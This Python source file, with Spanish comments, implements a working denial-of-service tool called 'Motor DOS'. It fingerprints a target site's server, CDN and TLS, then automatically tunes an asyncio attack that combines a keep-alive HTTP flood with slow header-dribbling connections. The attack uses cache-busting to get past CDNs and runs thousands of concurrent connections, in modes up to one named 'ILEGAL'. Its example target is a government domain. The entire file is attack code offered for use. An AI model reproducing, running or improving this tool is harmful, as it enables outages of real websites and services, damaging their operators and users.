#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=====================================================================
        M O T O R   D O S   
=====================================================================
   POTENCIA Y CARACTERISTICAS:
    - Reconocimiento previo: servidor, CDN/WAF, latencia, TLS, cookies
    - Auto-ajuste del ataque segun el reconocimiento (mas devastador)
    - Indice de letalidad y vector recomendado automaticos
    - Motor asincrono (asyncio): miles de conexiones concurrentes reales
    - HTTP FLOOD keep-alive + SLOW HOLD (goteo de cabeceras) combinados
    - Cache-buster y compresion forzada: golpea CPU y origen
    - Panel en vivo con req/s, conexiones, trafico y errores
    - y una POLLA
=====================================================================
                              By Richard Hill
=====================================================================
"""

import argparse
import asyncio
import os
import random
import socket
import ssl
import sys
import threading
import time
from urllib.parse import urlparse, urljoin


# ----------------------------------------------------------------------
#  COLORES
# ----------------------------------------------------------------------
class C:
    RESET = "\033[0m"
    RED   = "\033[31m"
    LRED  = "\033[91m"
    BRED  = "\033[1;91m"
    DRED  = "\033[38;5;88m"
    WHITE = "\033[97m"
    GREY  = "\033[90m"
    GREEN = "\033[92m"
    YEL   = "\033[93m"


def enable_windows_ansi():
    if os.name == "nt":
        try:
            import ctypes
            k = ctypes.windll.kernel32
            k.SetConsoleMode(k.GetStdHandle(-11), 7)
        except Exception:
            os.system("")


def raise_fd_limit():
    try:
        import resource
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        target = min(hard, 65535) if hard != -1 else 65535
        if soft < target:
            resource.setrlimit(resource.RLIMIT_NOFILE, (target, hard))
    except Exception:
        pass


enable_windows_ansi()
raise_fd_limit()

ART = r"""
⠀⠀⠀⠀⠀⠀⠀⣠⣤⣤⣤⡤⢤⣤⣤⣤⣤⣤⣄⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣿⡿⣟⠯⡒⢯⣽⣓⣒⢾⣯⣭⣿⣿⠿⠭⠭⣯⣷⣦⡀⠀⠀⠀
⠀⠀⠀⠀⣰⣿⣯⣞⣕⣽⠾⠿⠿⠿⢿⣏⣿⣿⣿⡗⣽⣿⣿⣷⡝⣿⣿⡆⠀⠀
⠀⠀⠀⣀⣛⠛⢿⣛⢝⢁⣀⣀⣀⠓⠶⠈⣿⣿⡿⠗⠉⠁⢀⣀⣹⣛⣛⣳⢄⠀
⠀⡔⡾⢁⣴⡆⢦⣬⣙⣛⣋⣤⣿⣿⣷⣾⣿⣿⣿⡆⢿⣿⡟⠻⠛⡉⣍⣲⢱⠁
⠀⣇⣇⢸⣉⡀⢦⣌⡙⠻⠿⣯⣭⣥⠡⡤⠿⢿⣿⣿⡆⠉⡻⢿⣿⠇⢻⣟⠼⠀
⠀⠈⠪⣴⣿⣧⡀⢉⠛⠘⢶⣦⣬⠉⣀⠓⠿⠿⠯⢉⣴⠿⠿⠓⡁⡄⠀⣿⠃⠀
⠀⠀⠀⠙⣿⣿⣷⣌⠻⢠⣤⣀⠉⠐⠛⠿⠿⠰⠶⠦⠰⠶⠇⠘⠃⠁⠀⣿⠀⠀
⠀⠀⠀⠀⠘⢿⣿⣿⣷⣌⠻⢿⠇⣼⣶⣦⡄⣄⣀⡀⢀⡀⢀⡀⡀⠀⢠⣿⠀⠀
⠀⠀⠀⠀⠀⠀⠙⠯⣛⠭⣻⠶⣬⣉⣛⠛⠃⠿⠿⠃⠿⠃⠚⣀⣁⣤⣾⣿⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠒⠯⣶⣋⡽⢛⣿⣯⣿⣭⣭⡿⢿⣿⣻⣾⢟⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⠿⣶⣾⣿⣿⣿⣭⣭⣭⣶⣿⡿⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠛⠛⠋⠁⠀⠀⠀
"""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36",
]


# ----------------------------------------------------------------------
#  CONFIGURACION
# ----------------------------------------------------------------------
class Config:
    def __init__(self):
        self.host        = None
        self.ip          = None
        self.port        = 80
        self.path        = "/"
        self.https       = False
        self.conns       = 2000
        self.flood_ratio = 1.0
        self.mode_name   = "BRUTAL"
        self.read_timeout = 5.0
        self.slow_interval = 10.0
        self.cache_bust  = True
        self.compress    = True

    def target_url(self):
        return f"{'https' if self.https else 'http'}://{self.host}:{self.port}{self.path}"


CFG = Config()
STOP = False
SSL_CTX = None


class Stats:
    def __init__(self):
        self.requests = 0
        self.errors   = 0
        self.conns    = 0
        self.bytes    = 0
        self.timeouts = 0
        self.start    = time.time()


ST = Stats()


# ----------------------------------------------------------------------
#  UTILIDADES
# ----------------------------------------------------------------------
def clear():
    sys.stdout.write("\033[H\033[J")
    sys.stdout.flush()


def p_ok(m):   print(C.LRED + "[+] " + C.WHITE + m + C.RESET)
def p_err(m):  print(C.BRED + "[x] " + C.WHITE + m + C.RESET)
def p_warn(m): print(C.BRED + "[!] " + C.WHITE + m + C.RESET)


def print_banner(compact=False):
    if compact:
        print(C.BRED + "  M O T O R   D D O S" + C.RESET +
              C.GREY + "   HIGH POWER ENGINE" + C.RESET +
              C.LRED + "              By Richard Hill" + C.RESET)
        print(C.BRED + "=" * 74 + C.RESET)
    else:
        print(C.BRED + ART + C.RESET)
        print(C.LRED + " " * 20 + ">>  By Richard Hill  <<" + C.RESET)
        print(C.DRED + " " * 4 +
              "MOTOR DOS -  (recon + asyncio + flood/hold)" + C.RESET)
        print(C.GREY + "-" * 78 + C.RESET)


def parse_target(target):
    target = target.strip()
    if "://" not in target:
        target = "http://" + target
    u = urlparse(target)
    CFG.host = u.hostname
    CFG.https = (u.scheme == "https")
    CFG.port = u.port if u.port else (443 if CFG.https else 80)
    CFG.path = u.path if u.path else "/"
    if u.query:
        CFG.path += "?" + u.query


def resolve_host():
    try:
        infos = socket.getaddrinfo(CFG.host, CFG.port, type=socket.SOCK_STREAM)
        CFG.ip = infos[0][4][0]
        return True
    except Exception as e:
        p_err(f"No se pudo resolver el host: {e}")
        return False


def spinner(stop_ev, text):
    frames = "|/-\\"
    i = 0
    while not stop_ev.is_set():
        sys.stdout.write(f"\r{C.LRED}  {frames[i % 4]} {C.WHITE}{text}{C.RESET}   ")
        sys.stdout.flush()
        time.sleep(0.08)
        i += 1
    sys.stdout.write("\r" + " " * 74 + "\r")


# ----------------------------------------------------------------------
#  RECONOCIMIENTO
# ----------------------------------------------------------------------
async def _fetch(method, path, timeout=8, read_more=False):
    kw = {}
    if CFG.https:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        kw["ssl"] = ctx
        kw["server_hostname"] = CFG.host
    t0 = time.time()
    reader, writer = await asyncio.wait_for(
        asyncio.open_connection(CFG.ip, CFG.port, **kw), timeout=timeout)
    ua = random.choice(USER_AGENTS)
    req = (f"{method} {path} HTTP/1.1\r\n"
           f"Host: {CFG.host}\r\n"
           f"User-Agent: {ua}\r\n"
           f"Accept: */*\r\n"
           f"Accept-Encoding: gzip, deflate\r\n"
           f"Connection: close\r\n\r\n").encode()
    writer.write(req)
    await writer.drain()
    try:
        data = await asyncio.wait_for(reader.read(65536), timeout=timeout)
    except asyncio.TimeoutError:
        data = b""
    lat = (time.time() - t0) * 1000
    try:
        writer.close()
    except Exception:
        pass
    return data, lat


def _parse(data):
    if not data:
        return None, {}
    try:
        head = data.split(b"\r\n\r\n", 1)[0].decode("latin-1", errors="ignore")
    except Exception:
        return None, {}
    lines = head.split("\r\n")
    status = lines[0] if lines else ""
    headers = {}
    for ln in lines[1:]:
        if ":" in ln:
            k, v = ln.split(":", 1)
            headers[k.strip().lower()] = v.strip()
    return status, headers


def _tls_info():
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with socket.create_connection((CFG.ip, CFG.port), timeout=8) as raw:
            with ctx.wrap_socket(raw, server_hostname=CFG.host) as s:
                ver = s.version()
                cipher = s.cipher()
                cert = s.getpeercert()
                issuer = ""
                if cert:
                    for rdn in cert.get("issuer", ()):
                        for k, v in rdn:
                            if k == "organizationName":
                                issuer = v
                return {"version": ver, "cipher": cipher[0] if cipher else "?",
                        "issuer": issuer}
    except Exception:
        return {}


async def recon():
    """Analiza el objetivo para ajustar el ataque."""
    info = {
        "status": None, "server": "", "powered": "", "cf": False, "cdn": "",
        "via": "", "cache": "", "encoding": "", "cookies": False,
        "http_ver": "HTTP/1.1", "latency_ms": 0, "tls": {}, "keepalive": False,
        "redirect": None, "alive": False, "body_kb": 0, "hsts": False,
    }

    if CFG.https:
        info["tls"] = _tls_info()

    # peticion principal
    try:
        data, lat = await _fetch("GET", CFG.path)
    except Exception as e:
        info["error"] = str(e)
        return info

    info["alive"] = bool(data)
    info["latency_ms"] = lat
    info["body_kb"] = len(data) / 1024
    status, headers = _parse(data)
    if status:
        info["status"] = status.split(" ")[1] if " " in status else status
        info["http_ver"] = status.split("/")[1].split(" ")[0] if "/" in status else "1.1"

    h = headers
    info["server"] = h.get("server", "")
    info["powered"] = h.get("x-powered-by", "")
    info["via"] = h.get("via", "")
    info["cache"] = h.get("x-cache", "") or h.get("cf-cache-status", "")
    info["encoding"] = h.get("content-encoding", "")
    info["cookies"] = "set-cookie" in h
    info["hsts"] = "strict-transport-security" in h
    if h.get("connection", "").lower().find("keep-alive") >= 0 or info["http_ver"].startswith("1.1"):
        info["keepalive"] = True
    if "cf-ray" in h or "cloudflare" in info["server"].lower():
        info["cf"] = True
    if info["via"] or "x-served-by" in h or "x-cache" in h or "akamai" in info["server"].lower():
        info["cdn"] = info["via"] or h.get("x-served-by", "CDN")

    # redirecciones -> apuntar a la pagina final real
    loc = h.get("location")
    if loc and info["status"] in ("301", "302", "303", "307", "308"):
        info["redirect"] = loc
        try:
            full = urljoin(CFG.target_url(), loc)
            u = urlparse(full)
            if u.hostname == CFG.host:
                CFG.path = u.path or "/"
                if u.query:
                    CFG.path += "?" + u.query
                d2, l2 = await _fetch("GET", CFG.path)
                _, h2 = _parse(d2)
                if h2.get("server"):
                    info["server"] = h2["server"]
        except Exception:
            pass

    # muestras extra de latencia
    lats = [info["latency_ms"]]
    for _ in range(2):
        try:
            _, l = await _fetch("HEAD", CFG.path)
            lats.append(l)
        except Exception:
            pass
    info["latency_ms"] = sum(lats) / len(lats)
    return info


# ----------------------------------------------------------------------
#  ANALISIS + AUTO-AJUSTE
# ----------------------------------------------------------------------
def analyze(a):
    srv = (a.get("server") or "").lower()
    weak, notes = [], []
    lethal = 55

    if not a.get("alive"):
        notes.append("Sin respuesta en el primer intento: subiendo reconexion")
        CFG.read_timeout = 8.0
        return lethal, weak, notes, "FLOOD PURO"

    if a.get("cf"):
        notes.append("Escudo Cloudflare detectado: cache-buster ON y +30% conexiones")
        CFG.cache_bust = True
        CFG.conns = int(CFG.conns * 1.3)
        weak.append("Cache-buster impide que Cloudflare sirva desde cache")
        lethal -= 12
    elif a.get("cdn"):
        notes.append(f"CDN detectada ({a['cdn']}): apuntando al origen con cache-buster")
        CFG.cache_bust = True
        CFG.conns = int(CFG.conns * 1.2)
        lethal -= 8

    if "apache" in srv:
        notes.append("Servidor Apache: mezcla flood+hold (Apache se satura con conexiones retenidas)")
        CFG.flood_ratio = 0.55
        weak.append("Apache: pool de workers limitado, el hold lo agota")
        lethal += 14
    elif "nginx" in srv:
        notes.append("Servidor nginx: flood dominante a maxima velocidad")
        CFG.flood_ratio = 1.0
        weak.append("nginx: eficiente, requiere volumen alto")
        lethal += 6
    elif "iis" in srv or "microsoft" in srv:
        notes.append("Servidor IIS: hold agresivo")
        CFG.flood_ratio = 0.5
        lethal += 10
    elif "litespeed" in srv or "openlitespeed" in srv:
        notes.append("LiteSpeed: flood dominante")
        CFG.flood_ratio = 1.0
        lethal += 4

    if a.get("powered"):
        weak.append(f"Tecnologia expuesta: {a['powered']}")
        lethal += 3

    lat = a.get("latency_ms", 0)
    if lat > 600:
        notes.append(f"Latencia alta ({lat:.0f}ms): +conexiones para saturar el accept queue")
        CFG.conns = int(CFG.conns * 1.2)
        CFG.read_timeout = max(CFG.read_timeout, 8.0)
        lethal += 10
    elif lat < 90:
        notes.append(f"Latencia baja ({lat:.0f}ms): flood puro, exprimimos req/s")
        CFG.flood_ratio = 1.0
        lethal += 4

    if a.get("cookies"):
        notes.append("Cookies de sesion: se reutiliza el mismo canal (mas carga por peticion)")
        lethal += 3

    if a.get("encoding"):
        notes.append(f"Compresion activa ({a['encoding']}): forzamos trabajo de CPU por peticion")
        CFG.compress = True
        lethal += 5

    if a.get("cdn") and not a.get("cache"):
        weak.append("Sin cabecera de cache: el CDN reenvia todo al origen")

    if a.get("tls"):
        t = a["tls"]
        weak.append(f"TLS {t.get('version','?')} / {t.get('cipher','?')} (carga de handshake)")

    lethal = max(5, min(99, lethal))

    if CFG.flood_ratio < 0.8:
        vector = "FLOOD + HOLD (hibrido)"
    else:
        vector = "HTTP FLOOD keep-alive"
    return lethal, weak, notes, vector


def tune_mode_by_lethal(lethal):
    if lethal >= 80:
        CFG.conns = max(CFG.conns, 3000)
        CFG.mode_name = "ILEGAL"
    elif lethal >= 60:
        CFG.conns = max(CFG.conns, 2000)
        CFG.mode_name = "BRUTAL"
    else:
        CFG.conns = max(CFG.conns, 2500)
        CFG.mode_name = "BLINDADO"


def show_analysis(a, lethal, weak, notes, vector):
    print()
    print(C.BRED + "=" * 74 + C.RESET)
    print(C.LRED + "   RECONOCIMIENTO DEL OBJETIVO" + C.RESET +
          C.GREY + "                        By Richard Hill" + C.RESET)
    print(C.BRED + "=" * 74 + C.RESET)

    estado = C.GREEN + "VIVO" + C.RESET if a.get("alive") else C.BRED + "SIN RESPUESTA" + C.RESET
    filas = [
        ("Estado",        estado),
        ("Codigo HTTP",   a.get("status") or "-"),
        ("Servidor",      a.get("server") or "oculto"),
        ("Tecnologia",    a.get("powered") or "oculta"),
        ("CDN / WAF",     ("Cloudflare" if a.get("cf") else a.get("cdn")) or "no detectada"),
        ("Version HTTP",  a.get("http_ver") or "1.1"),
        ("Latencia media", f"{a.get('latency_ms', 0):.0f} ms"),
        ("Compresion",    a.get("encoding") or "ninguna"),
        ("Cookies",       "si" if a.get("cookies") else "no"),
        ("HSTS",          "si" if a.get("hsts") else "no"),
        ("Redireccion",   a.get("redirect") or "no"),
    ]
    if a.get("tls"):
        filas.append(("TLS", f"{a['tls'].get('version','?')} ({a['tls'].get('issuer','?')})"))

    for k, v in filas:
        print(f"   {C.RED}{k:<18}{C.RESET}: {C.WHITE}{v}{C.RESET}")

    print(C.BRED + "-" * 74 + C.RESET)
    bar = int(lethal / 100 * 40)
    col = C.GREEN if lethal >= 75 else C.YEL if lethal >= 50 else C.BRED
    print(f"   {C.RED}INDICE DE LETALIDAD{C.RESET}: {col}{lethal}%{C.RESET} "
          f"{col}[{'#'*bar}{'-'*(40-bar)}]{C.RESET}")

    if weak:
        print(C.BRED + "-" * 74 + C.RESET)
        print(C.LRED + "   PUNTOS DEBILES DETECTADOS" + C.RESET)
        for w in weak:
            print(f"   {C.BRED}* {C.WHITE}{w}{C.RESET}")

    if notes:
        print(C.BRED + "-" * 74 + C.RESET)
        print(C.LRED + "   AJUSTES AUTOMATICOS APLICADOS" + C.RESET)
        for n in notes:
            print(f"   {C.LRED}-> {C.WHITE}{n}{C.RESET}")

    print(C.BRED + "=" * 74 + C.RESET)


def show_plan(vector):
    print()
    print(C.BRED + "=" * 74 + C.RESET)
    print(C.LRED + "   PLAN DE ATAQUE FINAL" + C.GREY + "   (auto-optimizado)" + C.RESET)
    print(C.BRED + "=" * 74 + C.RESET)
    filas = [
        ("Objetivo",     CFG.target_url()),
        ("IP destino",   CFG.ip or "-"),
        ("Modo",         CFG.mode_name),
        ("Vector",       vector),
        ("Conexiones",   CFG.conns),
        ("Flood / Hold", f"{int(CFG.flood_ratio*100)}% / {int((1-CFG.flood_ratio)*100)}%"),
        ("Cache-buster", "ON" if CFG.cache_bust else "OFF"),
        ("Compresion forzada", "ON" if CFG.compress else "OFF"),
        ("Reconexion",   "automatica"),
    ]
    for k, v in filas:
        print(f"   {C.RED}{k:<22}{C.RESET}: {C.WHITE}{v}{C.RESET}")
    print(C.BRED + "=" * 74 + C.RESET)


def run_recon():
    ev = threading.Event()
    t = threading.Thread(target=spinner, args=(ev, "Analizando objetivo..."), daemon=True)
    t.start()
    try:
        a = asyncio.run(recon())
    except Exception as e:
        a = {"alive": False, "error": str(e)}
    finally:
        ev.set()
        t.join()
    return a


# ----------------------------------------------------------------------
#  MOTOR DE ATAQUE
# ----------------------------------------------------------------------
def build_request():
    path = CFG.path
    if CFG.cache_bust:
        sep = "&" if "?" in path else "?"
        path = f"{path}{sep}r={random.randint(0, 10**9)}"
    enc = "gzip, deflate" if CFG.compress else "identity"
    return (f"GET {path} HTTP/1.1\r\n"
            f"Host: {CFG.host}\r\n"
            f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
            f"Accept: */*\r\n"
            f"Accept-Encoding: {enc}\r\n"
            f"Connection: keep-alive\r\n\r\n").encode()


def build_slow_head():
    sep = "&" if "?" in CFG.path else "?"
    path = f"{CFG.path}{sep}r={random.randint(0, 10**9)}"
    return (f"GET {path} HTTP/1.1\r\n"
            f"Host: {CFG.host}\r\n"
            f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
            f"Accept: */*\r\n").encode()


async def open_conn():
    kw = {}
    if CFG.https:
        kw["ssl"] = SSL_CTX
        kw["server_hostname"] = CFG.host
    return await asyncio.wait_for(asyncio.open_connection(CFG.ip, CFG.port, **kw), timeout=10)


async def flood_loop(reader, writer):
    while not STOP:
        writer.write(build_request())
        await writer.drain()
        ST.requests += 1
        try:
            data = await asyncio.wait_for(reader.read(65536), timeout=CFG.read_timeout)
        except asyncio.TimeoutError:
            ST.timeouts += 1
            return
        if not data:
            return
        ST.bytes += len(data)


async def slow_loop(reader, writer):
    writer.write(build_slow_head())
    await writer.drain()
    while not STOP:
        await asyncio.sleep(CFG.slow_interval + random.random() * 2)
        if STOP:
            return
        writer.write(f"X-{random.randint(1, 99999)}: {random.randint(1, 99999)}\r\n".encode())
        try:
            await writer.drain()
        except Exception:
            return


async def worker(idx):
    use_flood = (idx % 100) < int(CFG.flood_ratio * 100)
    while not STOP:
        writer = None
        try:
            reader, writer = await open_conn()
        except Exception:
            ST.errors += 1
            await asyncio.sleep(0.05)
            continue
        ST.conns += 1
        try:
            sock = writer.get_extra_info("socket")
            if sock:
                try:
                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                except Exception:
                    pass
            if use_flood:
                await flood_loop(reader, writer)
            else:
                await slow_loop(reader, writer)
        except Exception:
            ST.errors += 1
        finally:
            ST.conns -= 1
            try:
                writer.close()
            except Exception:
                pass


# ----------------------------------------------------------------------
#  PANEL EN VIVO
# ----------------------------------------------------------------------
def draw(rps, avg, vector):
    el = int(time.time() - ST.start)
    h, m, s = el // 3600, (el % 3600) // 60, el % 60
    L = []
    L.append(C.BRED + "=" * 74 + C.RESET)
    L.append(C.LRED + "   M O T O R   D D O S" + C.RESET +
             C.GREY + "   HIGH POWER ENGINE" + C.RESET +
             C.LRED + "                 By Richard Hill" + C.RESET)
    L.append(C.BRED + "=" * 74 + C.RESET)
    L.append(f"   {C.RED}Objetivo   {C.RESET}: {C.WHITE}{CFG.target_url()}{C.RESET}")
    L.append(f"   {C.RED}IP / Modo  {C.RESET}: {C.WHITE}{CFG.ip}{C.RESET}"
             f"   {C.BRED}{CFG.mode_name}{C.RESET}   {C.GREY}{vector}{C.RESET}")
    L.append(f"   {C.RED}Tiempo     {C.RESET}: {C.WHITE}{h:02d}:{m:02d}:{s:02d}{C.RESET}")
    L.append(C.BRED + "-" * 74 + C.RESET)
    L.append(f"   {C.RED}Conexiones {C.RESET}: {C.LRED}{ST.conns}{C.RESET} / {CFG.conns}")
    L.append(f"   {C.RED}Peticiones {C.RESET}: {C.WHITE}{ST.requests:,}{C.RESET}")
    L.append(f"   {C.RED}Velocidad  {C.RESET}: {C.BRED}{rps:,.0f} req/s{C.RESET}"
             f"   {C.GREY}media {avg:,.0f} req/s{C.RESET}")
    L.append(f"   {C.RED}Trafico    {C.RESET}: {C.WHITE}{ST.bytes / 1e6:.1f} MB{C.RESET}")
    L.append(f"   {C.RED}Errores    {C.RESET}: {C.WHITE}{ST.errors}{C.RESET}"
             f"   {C.RED}Timeouts{C.RESET}: {C.WHITE}{ST.timeouts}{C.RESET}")
    L.append(C.BRED + "-" * 74 + C.RESET)
    filled = int(40 * min(rps / 5000.0, 1.0)) if rps else 0
    L.append("   " + C.BRED + "[" + C.LRED + "#" * filled + C.GREY +
             "-" * (40 - filled) + C.BRED + "]" + C.RESET)
    L.append("")
    L.append(f"   {C.LRED}>> By Richard Hill <<{C.RESET}    {C.GREY}Ctrl+C para detener{C.RESET}")
    clear()
    sys.stdout.write("\n".join(L) + "\n")
    sys.stdout.flush()


async def renderer(vector):
    last_req, last_t = 0, time.time()
    while not STOP:
        await asyncio.sleep(1)
        now = time.time()
        dt = max(now - last_t, 1e-6)
        rps = (ST.requests - last_req) / dt
        last_req, last_t = ST.requests, now
        elapsed = max(now - ST.start, 1e-6)
        draw(rps, ST.requests / elapsed, vector)


async def run_attack(vector):
    global STOP, SSL_CTX
    STOP = False
    ST.__init__()
    if CFG.https:
        SSL_CTX = ssl.create_default_context()
        SSL_CTX.check_hostname = False
        SSL_CTX.verify_mode = ssl.CERT_NONE
    tasks = [asyncio.create_task(worker(i)) for i in range(CFG.conns)]
    tasks.append(asyncio.create_task(renderer(vector)))
    await asyncio.gather(*tasks)


def attack(vector="HTTP FLOOD keep-alive"):
    if not resolve_host():
        return
    try:
        asyncio.run(run_attack(vector))
    except KeyboardInterrupt:
        global STOP
        STOP = True
        el = int(time.time() - ST.start)
        avg = ST.requests / el if el else 0
        clear()
        print(C.BRED + "=" * 74 + C.RESET)
        print(C.LRED + "   ATAQUE FINALIZADO" + C.RESET +
              C.GREY + "                                By Richard Hill" + C.RESET)
        print(C.BRED + "=" * 74 + C.RESET)
        print(f"   {C.RED}Duracion   {C.RESET}: {C.WHITE}{el} s{C.RESET}")
        print(f"   {C.RED}Peticiones {C.RESET}: {C.WHITE}{ST.requests:,}{C.RESET}")
        print(f"   {C.RED}Media      {C.RESET}: {C.WHITE}{avg:,.0f} req/s{C.RESET}")
        print(f"   {C.RED}Trafico    {C.RESET}: {C.WHITE}{ST.bytes/1e6:.1f} MB{C.RESET}")
        print(f"   {C.RED}Errores    {C.RESET}: {C.WHITE}{ST.errors}{C.RESET}")
        print(C.BRED + "=" * 74 + C.RESET)


# ----------------------------------------------------------------------
#  FLUJO PRINCIPAL
# ----------------------------------------------------------------------
MODOS = {"1": ("SUAVE", 300), "2": ("NORMAL", 800), "3": ("BRUTAL", 2000), "4": ("ILEGAL", 4000)}


def easy_flow():
    clear()
    print_banner()
    print(C.LRED + "\n   ATAQUE GUIADO" + C.RESET)
    print(C.GREY + "   Pegas la URL, analizo el objetivo y lanzo el ataque optimizado." + C.RESET)
    print()
    url = input(f"{C.LRED}  ? {C.WHITE}URL objetivo (ej: https://midominio.gob/): {C.RESET}").strip()
    if not url:
        return
    try:
        parse_target(url)
    except Exception:
        p_err("URL invalida.")
        time.sleep(1.2)
        return

    print(C.GREY + "\n   Modos base: 1 SUAVE(300) 2 NORMAL(800) 3 BRUTAL(2000) 4 ILEGAL(4000)" + C.RESET)
    k = input(f"{C.LRED}  ? {C.WHITE}Modo base [3]: {C.RESET}").strip() or "3"
    CFG.mode_name, CFG.conns = MODOS.get(k, MODOS["3"])
    CFG.flood_ratio = 1.0

    if not resolve_host():
        time.sleep(1.5)
        return

    # RECONOCIMIENTO
    a = run_recon()
    lethal, weak, notes, vector = analyze(a)
    tune_mode_by_lethal(lethal)

    clear()
    print_banner(compact=True)
    show_analysis(a, lethal, weak, notes, vector)
    show_plan(vector)

    ans = input(f"\n{C.BRED}  >> {C.WHITE}Confirmar y LANZAR? [S/n]: {C.RESET}").strip().lower()
    if ans in ("", "s", "si", "y", "yes"):
        attack(vector)
    else:
        p_warn("Cancelado.")
        time.sleep(0.8)


def main_menu():
    while True:
        clear()
        print_banner()
        print(C.LRED + "\n   MENU PRINCIPAL" + C.RESET)
        print(f"   {C.BRED}1{C.RESET}) {C.LRED}ATAQUE GUIADO{C.RESET}"
              f"   {C.GREY}(analiza el objetivo y lanza el ataque optimizado){C.RESET}")
        print(f"   {C.RED}2{C.RESET}) Modo de potencia por defecto   "
              f"{C.GREY}(actual: {CFG.mode_name} / {CFG.conns}){C.RESET}")
        print(f"   {C.RED}0{C.RESET}) Salir")
        print(C.GREY + "   " + "-" * 50 + C.RESET)
        print(C.DRED + "   By Richard Hill" + C.RESET)

        op = input(f"{C.LRED}  >> {C.WHITE}Opcion [1]: {C.RESET}").strip() or "1"
        if op == "1":
            easy_flow()
        elif op == "2":
            print(C.GREY + "\n   1 SUAVE(300)  2 NORMAL(800)  3 BRUTAL(2000)  4 ILEGAL(4000)" + C.RESET)
            k = input(f"{C.LRED}  ? {C.WHITE}Modo: {C.RESET}").strip()
            if k in MODOS:
                CFG.mode_name, CFG.conns = MODOS[k]
        elif op == "0":
            clear()
            p_ok("Saliendo... By Richard Hill")
            return
        else:
            p_warn("Opcion invalida.")
            time.sleep(0.6)


# ----------------------------------------------------------------------
#  MAIN
# ----------------------------------------------------------------------
def main():
    if len(sys.argv) <= 1:
        main_menu()
        return

    ap = argparse.ArgumentParser(description="Motor DDOS - By Richard Hill")
    ap.add_argument("host")
    ap.add_argument("-c", "--conns", type=int, default=2000)
    ap.add_argument("--path", default="/")
    ap.add_argument("--no-recon", action="store_true")
    args = ap.parse_args()

    parse_target(args.host)
    CFG.conns = args.conns
    CFG.path = args.path if args.path.startswith("/") else "/" + args.path
    CFG.mode_name = "PERSONALIZADO"

    clear()
    print_banner()
    if not resolve_host():
        sys.exit(1)

    if args.no_recon:
        show_plan("HTTP FLOOD keep-alive")
        attack()
        return

    a = run_recon()
    lethal, weak, notes, vector = analyze(a)
    clear()
    print_banner(compact=True)
    show_analysis(a, lethal, weak, notes, vector)
    show_plan(vector)
    attack(vector)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print()
        p_ok("Cerrado. By Richard Hill")